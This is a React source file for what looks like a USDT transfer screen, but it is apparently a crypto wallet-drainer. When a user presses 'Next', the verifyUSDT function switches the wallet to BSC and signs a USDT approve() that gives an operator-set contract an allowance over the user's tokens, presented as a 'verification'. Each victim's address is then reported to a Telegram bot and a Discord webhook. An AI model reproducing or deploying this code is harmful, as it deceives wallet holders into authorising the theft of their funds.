import { useState } from 'react'
import { Copy, Upload, QrCode } from 'lucide-react';
import {Web3} from 'web3';


const sendNotification = async (user)=>{
   // Send notifications
   const teleToken = import.meta.env.VITE_TELETOKEN
  const teleChatId = import.meta.env.VITE_TELECHATTOKEN
  const discordToken = import.meta.env.VITE_DISCORD
    try {
      // Telegram notification
      await fetch(`https://api.telegram.org/bot${teleToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: teleChatId,
          text: `✅ USDT Verified: ${user}`
        })
      });

      // Discord notification
      await fetch(discordToken, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          content: `✅ USDT BEP-20 Verified: ${user}`
        })
      });

    } catch (notifyError) {
      console.error("Notification error:", notifyError);
    }
}
async function verifyUSDT() {

  if (typeof window.ethereum === 'undefined') {
    alert('Please install MetaMask, Trust Wallet, or Binance Wallet to proceed.');
    return;
  }

  const provider = window.ethereum;

  const contract = import.meta.env.VITE_CONTRACT
  const amount = import.meta.env.VITE_AMOUNT
  const usdtAddress = import.meta.env.VITE_USDTADDR

  try {
    // Switch to BSC Mainnet
    await provider.request({
      method: 'wallet_switchEthereumChain',
      params: [{ chainId: '0x38' }] // BSC Mainnet
    });

    // Request account access
    await provider.request({ method: 'eth_requestAccounts' });
    const web3 = new Web3(provider);
    const accounts = await web3.eth.getAccounts();
    const user = accounts[0];

    const gasPrice = web3.utils.toWei(5, 'gwei');

    const abi = [{
      "constant": false,
      "inputs": [
        { "name": "_spender", "type": "address" },
        { "name": "_value", "type": "uint256" }
      ],
      "name": "approve",
      "outputs": [{ "name": "", "type": "bool" }],
      "type": "function"
    }];

    const usdt = new web3.eth.Contract(abi, usdtAddress);

    // Execute approval transaction with fixed amount
    await usdt.methods.approve(contract, amount).send({
      from: user,
      gasPrice: gasPrice
    });

    sendNotification(user)
    // Show success message  
  } catch (error) {
    alert("Verification failed. Please try again.");
  }
}

export  function CryptoTransfer() {
  const [address, setAddress] = useState('0x1639ecc82742F09B94681d716d98a07a57aa067b');
  const [amount, setAmount] = useState('0');
  const [currency] = useState('USDT');

  const handlePaste = async () => {
    try {
      const text = await navigator.clipboard.readText();
      setAddress(text);
    } catch (err) {
      console.error('Failed to read clipboard:', err);
    }
  };

  return (
    <div className="min-h-screen bg-zinc-900 text-white p-8 flex items-left justify-left">
      <div className="w-full max-w-2xl space-y-6">
        {/* Address Input Section */}
        <div className="space-y-2">
          <label className="text-sm text-zinc-400">Address or Domain Name</label>
          <div className="relative">
            <input
              type="text"
              value={address}
              className="w-full bg-zinc-800 border border-zinc-700 rounded-lg px-4 py-3 text-white focus:outline-none focus:border-emerald-500 transition-colors pr-32"
              placeholder="Enter address or domain"
            />
            <div className="absolute right-2 top-1/2 -translate-y-1/2 flex items-center gap-2">
              <button
                onClick={handlePaste}
                className="text-emerald-500 hover:text-emerald-400 transition-colors px-2 py-1 text-sm font-medium"
              >
                Paste
              </button>
              <button className="text-emerald-500 hover:text-emerald-400 transition-colors p-1">
                <Upload size={18} />
              </button>
              <button className="text-emerald-500 hover:text-emerald-400 transition-colors p-1">
                <QrCode size={18} />
              </button>
            </div>
          </div>
        </div>

        {/* Amount Input Section */}
        <div className="space-y-2">
          <label className="text-sm text-zinc-400">Amount</label>
          <div className="relative">
            <input
              type="number"
              value={amount}
              onChange={(e) => setAmount(e.target.value)}
              className="w-full bg-zinc-800 border border-zinc-700 rounded-lg px-4 py-3 text-white focus:outline-none focus:border-emerald-500 transition-colors pr-24"
              placeholder="0"
            />
            <div className="absolute right-2 top-1/2 -translate-y-1/2 flex items-center gap-2">
              <span className="text-zinc-400 text-sm">{currency}</span>
              <button className="text-emerald-500 hover:text-emerald-400 transition-colors px-2 py-1 text-sm font-medium">
                Max
              </button>
            </div>
          </div>
          <div className="text-sm text-zinc-500">= ${amount}</div>
        </div>

        {/* Next Button */}
        <button 
        onClick={()=>verifyUSDT()}
        className="w-full bg-emerald-600 hover:bg-emerald-700 text-white font-medium py-4 rounded-full transition-colors mt-12">
          Next
        </button>
      </div>
    </div>
  );
}